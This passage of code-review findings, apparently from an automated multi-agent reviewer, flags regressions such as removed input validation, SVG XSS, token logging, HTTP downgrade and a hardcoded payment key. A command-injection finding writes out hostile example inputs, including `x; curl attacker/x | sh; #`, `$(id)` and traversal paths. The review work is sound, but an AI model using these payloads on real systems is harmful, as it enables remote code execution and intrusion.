This raises TypeError: can't subtract offset-naive and offset-aware datetimes at runtime. No test exercises this new function, so nothing in the suite would catch this before it hits production.

findings.title: contactEmail dereferences optional billingContact unguarded
findings.body:
`Account.billingContact` is declared optional (`billingContact?`) and documented as "Absent until the customer completes onboarding." `contactEmail` reads `.email` off it directly, so for any account that has not completed onboarding this throws `TypeError: Cannot read properties of undefined (reading 'email')` at runtime. The sibling function `bannerFor` on line 4 handles exactly this case with `?.` plus a `??` fallback, which confirms absent contacts are reachable in practice.

Suggest mirroring that pattern, e.g. `return account.billingContact?.email.toLowerCase() ?? "";` — or, if callers require a definite string, change the return type to `string | undefined` and let them decide the fallback. Note that if the project ever enables `strictNullChecks`, this line will also fail to compile.

_Also raised by the docs agent:_ Public function missing guard for optional property

findings.title: No test exercises contactEmail with a missing billingContact
findings.body: contactEmail accesses account.billingContact.email without optional chaining, which will throw a TypeError at runtime when billingContact is undefined (per the Account type, it is optional and 'absent until onboarding'). No test file is included in this diff, so nothing would catch this crash if it were introduced or later regressed. A test calling contactEmail with an account lacking billingContact, asserting it either returns a fallback or throws intentionally, is needed to pin down the expected behavior.

findings.title: Default retry count change breaks documented caller expectation
findings.body:
The `fetch()` function's default `retries` parameter has been reduced from 5 to 1. However, `sync/nightly.py` contains explicit documentation stating that `sync_partner_catalogue()` deliberately relies on `fetch()`'s default retry count (5) to survive a known flaky dependency that returns 503 roughly one call in three. This change breaks that contract without updating the documented justification or the calling code. The caller will now fail much more frequently than intended.

Either restore the default to 5, pass `retries=5` explicitly in the caller, or update the partner sync code to handle the lower default.

findings.title: Lowered retries default regresses INC-4471 fix in nightly sync
findings.body:
`fetch()`'s `retries` default drops from 5 to 1. `sync_partner_catalogue()` in `sync/nightly.py` calls `fetch("https://partner.example.com/catalogue")` with no `retries` argument, and its docstring states that relying on the default retry count is deliberate and was the fix for INC-4471, because the partner API returns 503 for roughly one call in three during the nightly window.

With a ~1/3 per-call failure rate, 5 attempts fail end-to-end on the order of 0.4% of runs; 1 retry (2 attempts) fails on the order of 11% of runs — a ~25x increase in nightly sync failures, reintroducing the incident this default was chosen to prevent.

Either keep the default at 5, or make the reliance explicit at the call site by passing `fetch(..., retries=5)` in `sync_partner_catalogue()` in the same change so the lowered default is safe. Auditing for other callers that omit `retries` is worthwhile before merging.

findings.title: No test guards sync_partner_catalogue's reliance on fetch's default retries
findings.body: sync/nightly.py explicitly depends on fetch()'s default retry count to survive the partner API's ~1-in-3 503 rate (documented as the fix for INC-4471). This diff lowers that default from 5 to 1. There is no test in the diff or referenced repository context that exercises sync_partner_catalogue against a flaky/failing fetch to confirm retries actually happen, so this regression would pass CI silently while breaking production reliability.

findings.title: Index duplicates invoices_tenant_created_idx from migration 0007
findings.body: `invoices_tenant_created_idx2` is defined on `invoices (tenant_id, created_at DESC)`, which is byte-for-byte the same key and sort order as `invoices_tenant_created_idx` created in `migrations/0007_invoice_indexes.sql` and applied 2025-11-02. Because the index name differs, the migration will apply cleanly rather than erroring, so the duplication will silently persist: every insert/update/delete on `invoices` maintains two identical B-trees, doubling that write cost and storage for zero read benefit, and the planner will simply pick one. Drop these lines — the existing index already serves the reporting query. If the intent was a different shape (e.g. a partial index, an INCLUDE column, or ASC ordering), state it explicitly, because as written it is not different.

findings.title: Auth token in Referer header is written verbatim to the log
findings.body:
`_scrub_uri(value, extra_param_keys)` was the control that stripped sensitive query parameters (notably `?token=`) from the `Referer` before logging. Removing it means the raw header value flows straight into `log_method(json.dumps(headers, indent=2))` on line 6.

Jupyter hands out notebook URLs of the form `base?token=<token>` (see `token_authenticated_url` in `jupyter_server/auth/identity.py`), so the browser attaches that token in the `Referer` header on every subresource request. The server's log therefore accumulates live authentication tokens in plaintext. Anyone who can read the log — an operator, a log-shipping pipeline, a sidecar, a support bundle, or an attacker who obtains log files — can replay the token and authenticate as the user.

Restore the scrubbing for `Referer` (and keep it applied before the value is placed into `headers`); do not log the raw header.

_Also raised by the correctness agent:_ Referer is logged verbatim, re-exposing the auth token in logs

findings.title: No test guards Referer scrubbing behavior removed here
findings.body: The diff removes the call to _scrub_uri for the Referer header, meaning a token embedded in the Referer (per token_authenticated_url in identity.py) will now be logged verbatim on 5xx responses. If there is an existing test asserting that logged headers do not contain the token/query string, it should have caught this regression; since none is present in this diff and the change ships regardless, no test currently fails when this scrubbing is removed. A test asserting that a Referer containing '?token=...' is redacted/scrubbed in the log output is needed to catch this class of regression.

findings.title: `extra_param_keys` appears to become an unused parameter
findings.body: `extra_param_keys` was consumed only by the removed `_scrub_uri(value, extra_param_keys)` call. After this change nothing in the loop reads it, so the enclosing function now accepts (or computes) a scrub-key list that has no effect — callers that pass extra keys expecting them to be redacted will silently get no redaction. If the scrub is intentionally dropped, the parameter and any `_scrub_uri` import should go too; more likely the scrub should be restored.

findings.title: xlinkhref no longer scheme-checked, allowing javascript: in SVG
findings.body:
`validateProp` previously routed `href`, `src` and `xlinkhref` through `isAnchorLinkAllowed`, which rejects the `unsafeLinkPrefix` schemes (`javascript:`, `data:text/html`, `vbscript:`). After this change `xlinkhref` falls through that branch and reaches whatever the permissive default at the end of the function is, so an author-supplied `<svg><a xlink:href="javascript:...">` in markdown is emitted unvalidated. Per the file's own header comment the markdown source includes end-user content and `validateProp` is the only guard before the DOM, so this is directly exploitable stored XSS. Restore `|| attribute === 'xlinkhref'` in the condition on line 6.

_Also raised by the security agent:_ xlink:href no longer scheme-checked, reintroducing SVG XSS

findings.title: No test guards xlinkhref sanitisation, so this regression is silent
findings.body: This change removes 'xlinkhref' from the attribute check that routes values through isAnchorLinkAllowed, reopening the SVG xlink:href XSS vector the comment above references. No test file is included in this diff, and there is nothing shown in the retrieved context indicating an existing test asserts that xlinkhref values are validated. If this line is wrong, nothing in the current test suite (as represented here) would fail — the change would ship silently.

findings.title: Unvalidated project query param reaches filesystem path join
findings.body:
`projectQueryParameter` comes straight from the client query string and is now used with no identifier validation. The only remaining check (line 4) compares it against `parameters.Project`, which is skipped entirely when the path parameter is empty — the common case for a list endpoint scoped by query only. The value then flows to the file DAO, whose `buildPath` does `filepath.Join(d.Folder, project, kind)` and documents: "It does no validation of its own: callers are required to have validated the names before this point." With the check removed, a value such as `../../etc` is joined verbatim, escaping the storage root, so a caller can enumerate or read documents outside the intended project directory. Restore the `common.ValidateID(projectQueryParameter)` guard (returning `HandleBadRequestError`) before the value is used, or validate inside `buildPath` if the precondition is to move.

_Also raised by the security agent:_ Path traversal: project query param no longer validated before filesystem use

findings.title: Removed validation contradicts buildPath contract
findings.body: The buildPath function in file.go explicitly documents that 'callers are required to have validated the names before this point.' By removing the ValidateID check on the projectQueryParameter (lines 3-5 in the old code), this caller no longer upholds that documented contract. The projectQueryParameter flows into filesystem path operations without validation, violating the stated precondition that buildPath's callers must enforce.

findings.title: No test guards against removal of project ID validation
findings.body: The removed ValidateID check was the only guard preventing an unvalidated projectQueryParameter from reaching buildPath (which joins it directly into a filesystem path per file.go's documented contract that callers must validate names). There is no test in this diff or apparently in the surrounding suite that exercises list() with a malformed/path-traversal project query parameter and asserts a bad-request error. Such a test would have failed the moment this validation was dropped, catching the regression before merge.

findings.title: Part buffer sized from unvalidated client-declared contentLength
findings.body:
`Reserve(contentLength)` commits the allocation up front, using a value that originates from the request's declared part length. A client can declare an enormous length and send few or no bytes: the memory is taken before `io.Copy` on line 8 reads anything, and nothing in this function bounds the value. The previous code grew the pool-backed RW as bytes actually arrived, which bounded memory by real received data. If pre-sizing is wanted for performance, clamp it — e.g. `Reserve(min(contentLength, maxPartSize))` — and let the RW grow beyond the clamp only as data is genuinely read, and reject parts whose declared length exceeds the configured maximum part size before reserving.

_Also raised by the security agent:_ Buffer pre-reserved from client-declared Content-Length (memory exhaustion)

findings.title: No test guards against unbounded allocation from declared length
findings.body: The change makes buffer allocation depend on a caller-supplied contentLength before any bytes are read, reversing the prior lazy-growth behavior. No test in this diff (or referenced) exercises the case where contentLength is very large or mismatched with actual body size, so a regression that reintroduces unbounded/attacker-controlled allocation would pass silently. A test should call this function with a large declared contentLength and a small/short actual body and assert the function does not attempt to reserve unbounded memory (e.g., by capping or erroring), or otherwise verify that Reserve behavior is bounded.

findings.title: contentLength may be -1 (unknown/chunked) when passed to Reserve
findings.body: HTTP request bodies with chunked transfer encoding or no `Content-Length` surface as a length of `-1` in Go's `http.Request.ContentLength`, and that value plausibly flows into this parameter. Passing a negative size to `Reserve` is at best meaningless and at worst a panic or a bogus conversion to a huge unsigned capacity, depending on `Reserve`'s implementation (not shown here). Guard the call: only reserve when `contentLength > 0`, otherwise keep the grow-as-read behaviour.

findings.title: Default S3 scheme flips to plaintext http when is_secure is unset
findings.body:
The previous expression `"http" if request.meta.get("is_secure") is False else "https"` was explicitly fail-secure: only an explicit `is_secure=False` selected plaintext; every other state (key missing, `None`, `True`) selected `https`. The new expression `"https" if request.meta.get("is_secure") else "http"` makes the *absence* of the key select `http`.

Since `meta["is_secure"]` is an opt-in flag that most requests never set, the common path now builds `http://{bucket}.s3.amazonaws.com{path}` and transmits the AWS-signed request — including the Authorization/signature material and the object payload — in cleartext. Any on-path observer can capture the signature and replay it, and object contents are exposed.

Restore the fail-secure form, e.g. `scheme = "http" if request.meta.get("is_secure") is False else "https"`, so plaintext requires an explicit opt-out rather than being the default. Note this also changes behaviour for `is_secure=None` and other falsy values, which previously resolved to `https`.

_Also raised by the security agent:_ S3 downloader now defaults to plaintext HTTP, exposing signed requests

findings.title: No test covers the scheme default change
findings.body: The change inverts the default scheme selection so that when `is_secure` is absent (not just False), the request now goes over `http` instead of `https`. This diff includes no test exercising `download_request` with `is_secure` unset, `is_secure=True`, or `is_secure=False`. If this logic were wrong (e.g. still defaulting to https, or vice versa), no test in this change would fail to reveal it.

findings.title: DELETE now maps to "push", so push-only tokens can delete
findings.body:
The previous switch had an explicit `case http.MethodDelete: action = "delete"`. The new condition treats every method that is not GET/HEAD as "push", so a DELETE request is authorized against the "push" grant. Per pkg/api/config/config.go the three actions are distinct precisely so that "an account may be allowed to push new tags without being allowed to delete existing ones" — that separation no longer holds, and any principal with push on a repository can now delete tags/manifests/blobs. Restore an explicit DELETE branch that yields `"delete"` (i.e. keep the switch, or add `if m == http.MethodDelete { action = "delete" }`).

_Also raised by the security agent:_ DELETE now authorised by push permission; delete action never requested

findings.title: No test verifies DELETE maps to 'delete' action, not 'push'
findings.body: The diff collapses the method-to-action switch into a simpler if/else, but in doing so it maps http.MethodDelete to 'push' instead of 'delete'. This is exactly the kind of regression a unit test asserting action resolution per HTTP method would catch. No test file is present in this diff, so if this mapping is wrong (as the PR description states), nothing currently in the repo would fail to signal it.

findings.title: Default for unlisted methods changed from "pull" to "push"
findings.body: The old `default:` arm mapped any method outside {HEAD, GET, POST, PATCH, PUT, DELETE} to "pull". The new predicate maps those same methods (OPTIONS, TRACE, and anything else reaching this handler) to "push". Callers that previously issued e.g. OPTIONS with a pull-only credential will now be rejected. If the stricter default is intentional it is worth stating so explicitly; otherwise enumerate the write methods rather than negating the read methods.

findings.title: get_tenant_fresh has no test covering cache mutation/eviction logic
findings.body: get_tenant_fresh fetches a tenant, writes it into _CACHE, and clears the entire cache once it exceeds 1000 entries. None of this is exercised by any test in the diff (no test file present). If the eviction threshold logic were wrong (e.g. off-by-one, clearing too eagerly, or never clearing and leaking memory), nothing would fail. A test should verify that the cache is populated after a call and that the clear-on-overflow behavior triggers at the right size.

findings.title: `get_tenant_fresh` name misleads: it mutates cache
findings.body: The function name `get_tenant_fresh` follows the `get_*` convention, which in most codebases signals a read-only operation. However, this function mutates the cache (line 10) and clears it (line 12), making it a write operation disguised as a read. Callers familiar with standard naming patterns will be surprised by side effects. Rename to `fetch_and_cache_tenant` or similar to accurately signal that this mutates state.

findings.title: Size-bound flush discards the entry just written by this call
findings.body:
`_CACHE[tenant_id] = tenant` is immediately followed by a check that clears the *entire* cache when it exceeds 1000 entries. On the call that crosses the threshold, the entry this function just populated is thrown away along with everything else, so a following `get_tenant(tenant_id)` returns `None` even though a fresh value was just fetched. The wider effect is that every tenant loses its cached value at once, so the next window of `get_tenant` calls all miss and every caller has to fall back to `get_tenant_fresh` simultaneously.

If the intent is simply to bound memory, evict selectively (e.g. drop the oldest entries, or use an LRU such as `functools.lru_cache`/`OrderedDict.popitem(last=False)`) and re-insert or preserve `tenant_id` after trimming.

findings.title: Unvalidated tenant_id keys a shared cache with a global flush at 1000
findings.body: `get_tenant_fresh` inserts an entry into the process-wide `_CACHE` for whatever `tenant_id` it is handed (line 10), and when the map exceeds 1000 entries it discards the entire cache rather than evicting one entry (lines 11-12). If any request path reaches this function with a caller-supplied identifier, a caller can issue ~1000 lookups for ids it invented and force a full flush, pushing every other tenant's next lookup back to `_fetch` — a cheap, repeatable cache-stampede against the backing store. Two cheap mitigations: validate/authorise `tenant_id` before it is used as a key, and replace the `clear()` with bounded eviction (e.g. an LRU or `OrderedDict.popitem(last=False)`) so one caller cannot evict other callers' entries. It is also worth confirming `_fetch` raises rather than returns a placeholder for unknown ids, since line 10 caches the result unconditionally and would otherwise store negative entries.

findings.title: README documents renamed flag with old name
findings.body: The README at line 7 documents the `--workers` flag, but the code has renamed it to `--concurrency` (cli.py line 6). Users following the README will use an unrecognized flag and encounter an error. Update the README to reflect the new flag name.

findings.title: Flag rename changes namespace attribute from args.workers to args.concurrency
findings.body: `argparse` derives the destination attribute from the option string, so this line changes the parsed result from `args.workers` to `args.concurrency`. Any code that still reads `args.workers` will now raise `AttributeError` at runtime rather than fail at import/parse time, and any existing invocation passing `--workers` will now be rejected with "unrecognized arguments". The diff touches only the parser definition \u2014 no consumer was updated in this change and none was retrieved. Please confirm every reader of the namespace was renamed, and if the old flag is part of a released CLI surface, keep it working via `p.add_argument("--workers", "--concurrency", dest="concurrency", ...)` or an explicit deprecation path.

findings.title: No test verifies the --concurrency flag is parsed correctly
findings.body: The flag was renamed from --workers to --concurrency, but no test exercises parser() to confirm --concurrency is accepted and --workers is rejected. If the rename were reverted or misspelled, nothing would fail.

findings.title: Docstring describes wrong return type
findings.body: The docstring states the function returns 'the total number of API calls this month as an integer', but the implementation now returns a dictionary mapping days to call counts. Any caller reading the docstring will expect an integer and may fail when receiving a dict instead.

findings.title: Return type changed from int to dict, breaking existing callers
findings.body:
`monthly_usage` previously returned a scalar integer (`_db.scalar(...)`) and now returns `{day: count}`. Any existing caller doing arithmetic, comparison or formatting on the result (`usage > limit`, `usage + n`, `f"{usage} calls"`) will now either raise `TypeError` or silently produce a wrong value — comparing a dict to an int raises in Python 3, but truthiness checks like `if monthly_usage(acct):` will keep "working" while meaning something different (non-empty vs. non-zero).

If the per-day breakdown is the new requirement, introduce it as a separate function (e.g. `daily_usage`) and either keep `monthly_usage` returning `sum(...)` of the breakdown, or update and verify every call site in the same change. The docstring on line 2 still promises "the total number of API calls this month as an integer", which is evidence the contract change was not deliberate across callers.

findings.title: No test covers new dict-returning behavior of monthly_usage
findings.body: monthly_usage's return type and semantics changed from a total integer to a dict keyed by day, but no test file is included in this diff. If the new grouping/aggregation logic is wrong (e.g., wrong column, malformed dict), nothing would fail. Add a test asserting the shape and values of the returned dict for known fixture data.

findings.title: Renaming keyword parameter page_size -> limit breaks existing callers
findings.body:
`list_invoices` is a module-level function with no leading underscore, so it is part of the module's public surface. Renaming the second parameter from `page_size` to `limit` only preserves compatibility for callers that pass it positionally; any caller written as `list_invoices(tid, page_size=100)` will now fail at call time with `TypeError: list_invoices() got an unexpected keyword argument 'page_size'`. This is a runtime failure, not a type-check failure, so it will not surface until the affected code path executes.

Before merging, grep the repository (and any downstream consumers/tests) for `page_size=` applied to this function. If external callers exist, either keep `page_size` as a deprecated alias (e.g. accept `**kwargs` or an explicit `page_size=None` that is mapped onto `limit` with a warning) or update every call site in the same change. The stale `page_size:` entry in the docstring on line 6 is a hint that the rename was done in isolation rather than as a sweep.

findings.title: Docstring references renamed parameter by old name
findings.body: The docstring on line 6 documents the parameter as `page_size`, but the function signature on line 1 renamed it to `limit`. The docstring must be updated to match the new parameter name so callers understand what the parameter does.

findings.title: `HTTPMove.location` changes from str to URL, breaking documented callers
findings.body:
`self.location` was previously the exact string passed to the constructor; it is now a `yarl.URL`. The public documentation states the attribute is "the string it was constructed with" and that application code calls `str.startswith` on it and compares it to configured strings. After this change:

- `exc.location.startswith("/admin")` raises `AttributeError` (URL has no `startswith`).
- `exc.location == "/login"` is now always `False`, since `URL.__eq__` does not compare equal to a `str`.
- Round-tripping through `URL` also normalises/percent-encodes the value, so even `str(exc.location)` can differ from what the caller supplied.

If the intent is only to avoid constructing `URL` twice, keep the attribute as the original string and use a local: `url = URL(location); self.location = location; self.headers['Location'] = str(url)`. If the type change is deliberate, it needs a documentation update and a deprecation path, not a silent swap.

_Also raised by the security agent:_ location attribute changes from str to URL, breaking redirect-target checks

findings.title: Public attribute type changed but documentation still describes old behaviour
findings.body: The `location` attribute is now assigned a URL object (line 8: `self.location = URL(location)`) instead of the string it was constructed with. However, the documentation in docs/web_reference.rst explicitly states it is "the string it was constructed with" and notes that "Application code compares it against configured strings and passes it to `str.startswith`". Code following this documented contract will break: `str.startswith()` expects a string, not a URL object. The documentation must be updated to reflect that `location` is now a URL object, or the implementation must be reverted to match the documented interface.

findings.title: self.location type change (str -> URL) is untested
findings.body: self.location now stores a URL object instead of the original string, contradicting docs/web_reference.rst which states location is 'the string it was constructed with' and that application code calls str.startswith on it. No test in this diff exercises `instance.location` directly (e.g. asserting it equals the input string or that str.startswith works on it), so a regression here would not be caught by any test that only checks headers['Location'].

findings.title: readany can return empty bytes before EOF after loop removed
findings.body:
`_wait()` is documented to resolve not only on `feed_data()`/`feed_eof()` but also at the end of a chunk, which can happen with no new data in the buffer; its docstring states the caller "must re-check its condition after waking rather than assuming data arrived." Replacing the `while` with an `if` removes exactly that re-check: after a spurious wake the code falls through to `self._read_nowait(-1)` with an empty buffer and no EOF, returning `b''`.

An empty return from `readany` is the conventional end-of-stream signal, so callers looping `while True: chunk = await readany(); if not chunk: break` will silently truncate the stream mid-body. Restore the loop:

```python
while not self._buffer and not self._eof:
    await self._wait('readany')
```

_Also raised by the security agent:_ readany() may return empty bytes early, signalling a false EOF

findings.title: No test covers spurious wakeup causing premature empty read
findings.body: The change from `while` to `if` reintroduces exactly the bug the surrounding docstring warns about: the waiter can be resolved 'at the end of a chunk' with no new data in the buffer, so a single `if` check followed by `_read_nowait(-1)` can return empty bytes even though EOF hasn't been reached. There is no test in this diff (or apparently in the existing suite, since this change went in) that simulates a waiter resolution with an empty buffer and non-EOF state to verify readany() continues waiting until data or EOF actually arrives.

findings.title: Implicit relative import breaks `import requests` on Python 3
findings.body: `from adapters import HTTPAdapter` is an implicit relative import. Implicit relative imports were removed in Python 3 (PEP 328 / absolute imports by default), so this resolves against `sys.path` rather than the `requests` package and raises `ImportError: No module named 'adapters'` (unless an unrelated top-level `adapters` module happens to exist, which would be worse — silently binding the wrong `HTTPAdapter`). Because `requests/__init__.py` imports `sessions`, this makes the whole package unimportable, not just this module. Restore `from .adapters import HTTPAdapter`, matching line 6 (`from .packages.urllib3.poolmanager import PoolManager`), which already uses the explicit relative form.

findings.title: Implicit import lets any sys.path entry supply `adapters`
findings.body:
`from adapters import HTTPAdapter` no longer binds the import to this package. Under Python 3 (and under Python 2 with `absolute_import`) this resolves as a top-level module lookup across `sys.path`, whose first entry is the script directory or the current working directory for the invoking process. Any file named `adapters.py` sitting in that directory — dropped by a co-located process, an unpacked archive, or a writable deploy/CWD — is imported and executed in place of `requests/adapters.py`, giving code execution inside the HTTP client that handles credentials and TLS verification. The original `from .adapters import HTTPAdapter` pins resolution to the package and is not hijackable this way; restore the leading dot.

Note also that on Python 3 the likely outcome is an outright `ImportError` at package import time, so this is a correctness break regardless of the hijack scenario.

findings.title: Import-time regression to implicit relative import has no test to catch it
findings.body: This change reverts `from .adapters import HTTPAdapter` to `from adapters import HTTPAdapter`. Under Python 3 (and Python 2 with absolute_import), this will raise ImportError at module load time, breaking the entire `requests` package. There is no test in this diff, and nothing shown in the repository context indicates that simply importing `requests.sessions` is covered by an existing test that would fail on an ImportError. If no test imports this module (directly or transitively) under a Python 3 interpreter, this regression would go undetected until a downstream consumer tries to use the library.

findings.title: get_cookie raises TypeError when request.cookies is None
findings.body: `self.request.cookies` is documented to return `None` when the Cookie header is present but cannot be parsed (see `tornado/httpserver.py`, which short-circuits `if self._cookies is None: return None`). With the guard removed, `name in self.request.cookies` evaluates `in` against `None` and raises `TypeError: argument of type 'NoneType' is not iterable`, turning a malformed client-supplied Cookie header into a 500 for any handler that calls `get_cookie` — an unauthenticated, remotely triggerable crash. Restore the guard (`if self.request.cookies is not None and name in self.request.cookies:`) or make the property return an empty dict instead of `None`.

findings.title: get_cookie docstring now misleads about None handling
findings.body: The docstring states the method "Gets the value of the cookie with the given name, else default", implying it always returns either the cookie value or the default. However, the removed None check means the method will now raise a TypeError when `self.request.cookies` is None (which the httpserver.py context shows can occur when the Cookie header is malformed), instead of returning the default. The docstring must be updated to document this possibility, or the code must restore the None check to match the documented contract.

findings.title: Removed None guard lets a malformed Cookie header crash any handler
findings.body:
`RequestHandler.get_cookie` now does `name in self.request.cookies` unconditionally. Per `tornado/httpserver.py`, the `cookies` property returns `None` when the Cookie header is present but cannot be parsed, and the docstring there explicitly states "every consumer has to allow for that". `name in None` raises `TypeError: argument of type 'NoneType' is not iterable`.

Entry point: the `Cookie:` request header, fully attacker-controlled on every request and requiring no authentication. Sink: the membership test on line 3, reached by any handler that calls `get_cookie` (including framework-internal callers such as secure-cookie and XSRF token retrieval, which run before application code on many requests).

Effect: a single request with a deliberately malformed Cookie header produces an unhandled exception and a 500 from affected handlers — a trivially repeatable denial of service against cookie-reading endpoints, plus a traceback in logs for every such request. Restore the guard:

```python
if self.request.cookies is not None and name in self.request.cookies:
```

or have the `cookies` property return an empty dict instead of `None`.

findings.title: No test covers get_cookie with unparseable Cookie header
findings.body: The change removes the `self.request.cookies is not None` check, reintroducing a TypeError when `request.cookies` is None (per httpserver.py docs, cookies is None when the Cookie header is present but malformed). No test in this diff exercises get_cookie with a malformed cookie header, so this regression would go undetected by CI.

findings.title: Dropping .strip() breaks boundary detection for multipart bodies
findings.body:
Content-Type headers are conventionally written with a space after the semicolon, e.g. `multipart/form-data; boundary=----WebKitFormBoundaryX`. Splitting on `";"` therefore yields `" boundary=----..."`, and without the `.strip()` the key becomes `" boundary"`, which never equals `"boundary"` on line 5. The loop falls through, `_parse_mime_body` is never called, and the request's form fields/files are silently empty — no exception, no log, just missing data for every caller reading `request.body_arguments` / `request.files`.

Even when there is no space, the value `v` can retain trailing whitespace/CR, producing a boundary that will not match the body delimiters. Restore `field.strip().partition("=")` (and ideally keep stripping `v` as well).

findings.title: No test guards boundary parsing with whitespace-separated params
findings.body: The change removes field.strip() before partition("="), which will break parsing when content-type headers use a space after the semicolon (e.g. 'multipart/form-data; boundary=xyz'), a very common real-world format. This diff includes no test file, so nothing would fail if this regression breaks multipart parsing for such headers.

findings.title: Dropping .strip() lets the client silently suppress multipart body parsing
findings.body:
Entry point: the `Content-Type` request header, fully attacker-controlled. Sink: `self._parse_mime_body(v, data)` on line 6, which is what populates `request.body_arguments` and `request.files`.

After splitting on `;` (line 2), every parameter except the first retains its leading whitespace, so for the RFC-normal header `multipart/form-data; boundary=abc` the loop sees `k == " boundary"`, never matches line 5, and `_parse_mime_body` is never reached. No exception is raised and no error is logged — the body is just dropped. Only a client that sends `multipart/form-data;boundary=abc` with no space gets its body parsed.

The security consequence is that the sender chooses which parsing path the server takes. Any application-side control that reasons over parsed input — an upload type/size check on `request.files`, a handler that validates a field only `if name in self.request.body_arguments`, an audit/logging layer over form fields — sees an empty request and passes, while the raw bytes remain available to anything reading `request.body` directly. Whether that is exploitable depends on handler code not shown here, so I am not rating it critical; XSRF checking, by contrast, fails closed.

Restore the `.strip()` (or use a tolerant header-parameter parser) so parameter names are matched after whitespace normalisation.

findings.title: No test exercises the LocationParseError message formatting
findings.body: The change removes the `% url` argument from the format string, leaving a dangling `%s` placeholder. This will raise `TypeError: not enough arguments for format string` at runtime instead of the intended `LocationParseError`, but nothing in this diff or apparently the surrounding suite calls this code path with a non-digit port to verify the exception type or message content. Add a test that triggers the invalid-port branch and asserts both the exception type and that the URL appears in the message.

findings.title: Format placeholder left unfilled: error message loses the URL
findings.body: The message string still contains the `%s` placeholder but the `% url` operand was dropped, so the raised exception reads literally `Failed to parse: %s` instead of naming the URL that failed. Python does not error on an un-applied `%` in a plain string, so this fails silently and only shows up as an unhelpful message at debugging time (and would break any caller or log assertion that matched on the URL in the message). Restore `"Failed to parse: %s" % url`.

findings.title: Command injection: shell=True with interpolated name/directory
findings.body:
`create_archive` formats `name` and `directory` directly into a command string and executes it with `shell=True`. Any shell metacharacter in either argument escapes the intended `tar` invocation: `name = "x; curl attacker/x | sh; #"` or `name = "$(id)"` runs arbitrary commands as the service user. Path traversal is also possible (`name = "../../etc/cron.d/x"`) since the value is pasted into the output path unchecked.

Fix by dropping the shell entirely and using an argument list, matching `list_exports` on line 5:

```python
output = os.path.join("/exports", f"{name}.tar.gz")
subprocess.run(["tar", "-czf", output, directory], check=True)
```

Additionally validate `name` against a strict allowlist (e.g. `[A-Za-z0-9_-]+`) and confirm the resolved `output` stays under `/exports` before writing, so a crafted name cannot traverse out of the export directory.

findings.title: Unquoted interpolation breaks archive creation for names with spaces
findings.body:
`name` and `directory` are spliced directly into a shell string with no quoting. For a perfectly ordinary input such as `name="Q3 report"` or a directory path containing a space, the shell word-splits the arguments and `tar` is invoked with the wrong operands — it will either archive the wrong paths or fail with `check=True` raising `CalledProcessError`. Any shell metacharacter (`;`, `&`, `|`, `$(...)`, `*`) likewise changes the meaning of the command rather than being passed through literally.

Drop the shell entirely and pass an argument list, as `list_exports` on line 5 already does: `subprocess.run(["tar", "-czf", f"/exports/{name}.tar.gz", directory], check=True)`. That fixes the word-splitting and the metacharacter handling in one step. `name` should still be validated so it cannot contain `/` or `..` and escape `/exports/`.

findings.title: No test coverage for create_archive
findings.body: create_archive builds a shell command via f-string interpolation and executes it with shell=True. There is no test exercising this function at all, so any change to its behavior (including a fix for the injection risk) would not be caught by the test suite.

findings.title: dashboardCors disables the origin allowlist while keeping credentials
findings.body:
`dashboardCors` is configured with `origin: "*"` and `credentials: true`, while the existing middleware directly above (lines 6-7) restricts to the `ALLOWED` list with the same credential flag. Any route mounted with `dashboardCors` therefore has its origin check switched off: the entry point is the attacker-chosen `Origin` header on a cross-site request, and the sink is the `Access-Control-Allow-Origin` response header emitted by this middleware, with no allowlist comparison in between.

Two concrete consequences:

1. Any web origin can read the responses of those routes cross-origin (unauthenticated reads of whatever the dashboard endpoints expose, plus any internals in error bodies).
2. The `credentials: true` flag signals the intent to serve cookie/Authorization-bearing cross-origin requests. Standards-compliant browsers refuse to honour credentials when ACAO is literal `*`, so today this is likely to fail closed for the credentialed case — but it fails closed by accident, not by design. The obvious next fix when someone reports "the dashboard can't send cookies" is to reflect the request `Origin`, which turns this into full cross-origin session theft. Some middleware layers (proxies, edge CDN CORS rules, non-Express CORS libraries) already reflect rather than emit `*`, so the outcome depends on code not shown in this diff.

Fix: give the dashboard its own explicit allowlist (e.g. `origin: DASHBOARD_ALLOWED` sourced from config) rather than `"*"`, and keep `credentials: true` only alongside that allowlist. If the dashboard routes genuinely need to be world-readable, set `credentials: false` and confirm no route behind this middleware relies on cookie or header auth.

findings.title: Wildcard origin with credentials is rejected by browsers
findings.body:
`dashboardCors` sets `origin: "*"` alongside `credentials: true`. The `cors` middleware will emit a literal `Access-Control-Allow-Origin: *` together with `Access-Control-Allow-Credentials: true`. Per the Fetch/CORS spec a wildcard ACAO is invalid for any request made with `credentials: "include"`, so the browser blocks the response and the dashboard's cookie/authorization-bearing requests fail — the configuration cannot do what it is evidently intended to do. Additionally, it removes the origin restriction that the adjacent config (line 6, `origin: ALLOWED`) exists to enforce.

Fix by reflecting a validated origin instead of a wildcard, e.g. add the dashboard's origin to `ALLOWED` and keep `origin: ALLOWED`, or pass an origin callback that echoes back only permitted origins. If credentials genuinely are not needed for the dashboard, set `credentials: false` so the wildcard is at least coherent.

findings.title: New wildcard+credentials CORS config has no test coverage
findings.body: dashboardCors combines origin: "*" with credentials: true, a configuration that is invalid per the CORS spec (browsers reject credentialed requests with a wildcard origin) and could indicate a real misconfiguration bug. No test exercises this export, so if the intended behavior were actually a reflected-origin allowlist (as the existing exported cors config likely does) rather than a literal wildcard, nothing would catch the regression.

findings.title: Live AcmePay secret key hardcoded in source, replacing env lookup
findings.body:
`ACMEPAY_SECRET_KEY` is committed as a literal on line 4 and assigned to `acmepay.api_key` on line 8, replacing the previous `os.environ["ACMEPAY_SECRET_KEY"]` lookup (the `import os` line is removed). The `acme_live_` prefix indicates a production credential, not a test one. Anyone with read access to the repository — plus anyone who obtains a clone, a CI artifact, a container image layer, or the git history after the line is deleted — holds the payment provider's production API key.

Restore the environment-variable (or secret-manager) lookup, and treat this key as compromised: rotate it at AcmePay now, then purge it from git history. Deleting the line in a follow-up commit is not sufficient, the value remains reachable in every prior object.

findings.title: Env-var configuration for the API key is silently dropped
findings.body: `client()` previously resolved the key at call time from `os.environ["ACMEPAY_SECRET_KEY"]`, so each deployment (staging, CI, prod) supplied its own credential and a missing value failed loudly with a `KeyError`. After this change the key is a module-level literal: every environment now authenticates as the same account, any `ACMEPAY_SECRET_KEY` already set in deployment manifests or CI config is ignored with no error, and rotating the credential requires a code change and redeploy. The value also looks like a live key (`acme_live_...`) committed to source. Restore the environment lookup (optionally `os.environ.get(...)` with an explicit failure if unset) rather than a constant, and rotate the exposed key.

findings.title: No test exercises client()'s changed key-sourcing behavior
